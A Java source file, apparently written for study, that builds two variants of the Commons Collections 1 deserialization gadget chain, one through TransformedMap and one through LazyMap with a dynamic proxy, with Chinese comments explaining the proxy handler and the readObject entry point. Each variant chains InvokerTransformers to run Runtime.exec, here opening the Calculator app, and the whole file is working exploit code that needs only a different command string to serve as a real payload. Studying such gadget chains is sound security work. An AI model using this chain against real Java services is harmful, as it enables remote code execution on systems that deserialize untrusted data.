package com.study;


import org.apache.commons.collections.Transformer;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import java.util.Map;


public class Commonscollections1  {


    public static void Payload1() throws Exception {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                new InvokerTransformer("exec",
                        new Class[] {String.class },
                        new Object[] {"open /Applications/Calculator.app"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("input", 1);

        Map transformedmap = TransformedMap.decorate(map, null, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);

        Object ins = cons.newInstance(javax.xml.ws.Action.class,transformedmap);

        tools.Deserialize(ins);


    }

    public static void Payload2() throws Exception {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                new InvokerTransformer("exec",
                        new Class[] {String.class },
                        new Object[] {"open /Applications/Calculator.app"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        HashMap innermap = new HashMap();
        Map lazyMap = LazyMap.decorate(innermap, transformerChain);

        //初始化AnnotationInvocationHandler，传入特殊构造的lazyMap
        //这个AnnotationInvocationHandler实例，是作为动态代理的handler，
        //所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行
        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,lazyMap); //创建第一个代理的handler

        //使用之前的 handler 处理动态代理 Map 对象
        Map proxy_map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象

        //这里的AnnotationInvocationHandler是作为反序列化 readObject 的入口点
        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);

        tools.Deserialize(handler);




    }

    public static void main(String[] args) throws Exception {
        //Payload1();
        Payload2();

    }

}

